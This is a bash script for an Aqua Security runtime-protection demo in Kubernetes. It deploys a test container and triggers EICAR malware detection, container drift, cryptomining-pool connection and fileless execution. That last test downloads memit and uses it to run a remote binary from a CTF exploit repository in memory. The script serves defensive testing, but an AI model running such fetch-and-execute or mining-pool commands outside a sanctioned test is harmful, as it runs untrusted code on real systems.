#!/bin/bash

print_logo() {
    echo "                                                                                          "
    echo "                                                                                          "
    echo "                                                                                          "
    echo "         .:-----=##*.       .--=--.         :-==-:      ::.        :::     .:-==-.        "
    echo "        :-------=%%%:     -#%%%%%%%#-     +%%%%%%%%*:   %%*        %%#   :#%%%%%%%#-      "
    echo "      :-        :%%%:    *%%+:   :+%%*  .#%%=.  .-#%%-  %%*        %%#  +%%+:   :+%%*     "
    echo "    .---        :%%%:   =%%=       =%%- *%%.       #%%  %%*        %%# -%%+       -%%=    "
    echo "    .---        :%%%.   =%%-       -%%= *%%.       *%%  %%#       .%%* -%%=       .%%+    "
    echo "    .---        :%%%:   =%%-       -%%= *%%.       *%%  %%#       .%%* -%%=       .%%+    "
    echo "    .---        :#+:     #%%=.     -%%= .%%#-      *%%  =%%+.    :#%%.  #%%=.     .%%+    "
    echo "    :***++++++++-.        =%%%%#####%%=  .+%%%##*: *%%   -*%%%##%%%+.    -#%%%#####%%+    "
    echo "    :#########+.            .-=+++++++:     :==-   *%%     .-=++=:         .-=+++++++-    "
    echo "                                                   *%%                                    "
    echo "                                                   *%%                                    "
    echo "                                                   *%%                                    "
    echo "                                                                                          "
}

check_container_existence() {
    # Check if the aqua-test-container deployment already exists
    kubectl get deployment aqua-test-container >/dev/null 2>&1
    return $?
}

deploy_test_container() {
    # Check if the aqua-test-container deployment already exists
    if check_container_existence; then
        echo "Aqua test container already exists. Redeploying..."
        delete_test_container
    fi

    echo "Deploying Aqua test container..."
    # Deploying the container using kubectl
    kubectl create deployment aqua-test-container --image=stanhoe/ubuntu-wget:latest -- sleep infinity

    # Wait for the deployment to complete
    echo "Waiting for the deployment to complete..."
    kubectl wait --for=condition=available deployment/aqua-test-container --timeout=60s

    # Check if deployment was successful
    if [ $? -eq 0 ]; then
        echo "Aqua test container deployed successfully."
    else
        echo "Failed to deploy Aqua test container."
    fi
}

delete_test_container() {
    echo "Deleting Aqua test container..."
    kubectl delete deployment aqua-test-container
}

main() {
    print_logo
    echo "Welcome to the Aqua Runtime Security POC Test Program!"
    echo

    # Check if Aqua test container exists
    if check_container_existence; then
        echo "Aqua test container already exists."
        read -p "Would you like to redeploy the test application? (y/n): " redeploy_choice
        if [[ "$redeploy_choice" =~ ^[Yy] ]]; then
            delete_test_container
            deploy_test_container
        else
            echo "Proceeding to options..."
        fi
    else
        echo "Aqua test container does not exist."
        echo "Proceeding to options..."
    fi
    echo

    while true; do
        echo "Please select an option:"
        echo "1. Deploy/Redeploy test container"
        echo "2. Test Real-time Malware Protection"
        echo "3. Test Drift Prevention"
        echo "4. Test Block Cryptocurrency Mining"
        echo "5. Test Block Fileless Execution (*Must Turn off Drift Prevention Control)"
        echo "6. Terminate Program"
        echo

        read -p "Enter your choice (1/2/3/4/5/6): " choice

        case $choice in
            1)
                deploy_test_container
                ;;
            2)
                # Execute commands in the deployed container
                if check_container_existence; then
                    pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                    container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                    echo "Executing 'ls -la' command in the container..."
                    kubectl exec -it $pod_name --container $container_name -- ls -la
                    echo "Executing wget command in the container..."
                    kubectl exec -it $pod_name --container $container_name -- wget https://raw.githubusercontent.com/stanezil/eicar/main/eicar.txt
                    if [ $? -eq 0 ]; then
                        echo "Eicar AMP test file downloaded successfully."
                        echo "Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
                    else
                        echo "Failed to download Eicar AMP test file."
                    fi
                    echo "Executing 'ls -la' command again in the container..."
                    kubectl exec -it $pod_name --container $container_name -- ls -la
                else
                    echo "Aqua test container is not deployed. Please deploy it first."
                fi
                ;;
            3)
                # Make a copy of /bin/ls and execute the copy
                if check_container_existence; then
                    pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                    container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                    echo "Copying '/bin/ls' to '/tmp/ls_copy' in the container..."
                    kubectl exec -it $pod_name --container $container_name -- cp /bin/ls /tmp/ls_copy
                    echo "Executing '/tmp/ls_copy' command in the container..."
                    kubectl exec -it $pod_name --container $container_name -- /tmp/ls_copy
                    echo "Container drift blocked successfully."
                    echo "Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
                else
                    echo "Aqua test container is not deployed. Please deploy it first."
                fi
                ;;
            4)
                # Test Block Cryptocurrency Mining
                if check_container_existence; then
                    pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                    container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                    echo "Executing 'wget us-east.cryptonight-hub.miningpoolhub.com:205' command in the container..."
                    kubectl exec -it $pod_name --container $container_name -- wget us-east.cryptonight-hub.miningpoolhub.com:205
                    echo "Cryptocurrency mining website blocked successfully."
                    echo "Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
                else
                    echo "Aqua test container is not deployed. Please deploy it first."
                fi
                ;;
            5)
                # Block Fileless Execution
                if check_container_existence; then
                    pod_name=$(kubectl get pods -l app=aqua-test-container -o jsonpath='{.items[0].metadata.name}')
                    container_name=$(kubectl get pods $pod_name -o jsonpath='{.spec.containers[0].name}')
                    echo "Executing 'wget https://github.com/liamg/memit/releases/download/v0.0.3/memit-linux-amd64' command in the container..."
                    kubectl exec -it $pod_name --container $container_name -- wget https://github.com/liamg/memit/releases/download/v0.0.3/memit-linux-amd64
                    echo "Executing 'chmod +x memit-linux-amd64' command in the container..."
                    kubectl exec -it $pod_name --container $container_name -- chmod +x memit-linux-amd64
                    echo "Executing './memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist' command in the container..."
                    kubectl exec -it $pod_name --container $container_name -- ./memit-linux-amd64 https://raw.githubusercontent.com/MaherAzzouzi/LinuxExploitation/master/Fword2020/blacklist/blacklist
                    echo "Filess execution blocked successfully."
                    echo "Please login to the Aqua Console's Incident Screen to view a summary of the security incident."
                else
                    echo "Aqua test container is not deployed. Please deploy it first."
                fi
                ;;
            6)
                # Terminate the program
                read -p "Do you want to delete the Aqua test container before termination? (y/n): " delete_container
                case $delete_container in
                    [Yy]*)
                        delete_test_container
                        ;;
                    [Nn]*)
                        echo "Exiting program without deleting the Aqua test container."
                        ;;
                    *)
                        echo "Invalid input. Exiting program without deleting the Aqua test container."
                        ;;
                esac
                exit
                ;;
            *)
                echo "Invalid choice. Please choose a valid option."
                echo
                ;;
        esac

        echo
        # Add a short delay before showing the options menu again
        sleep 3
    done
}

main
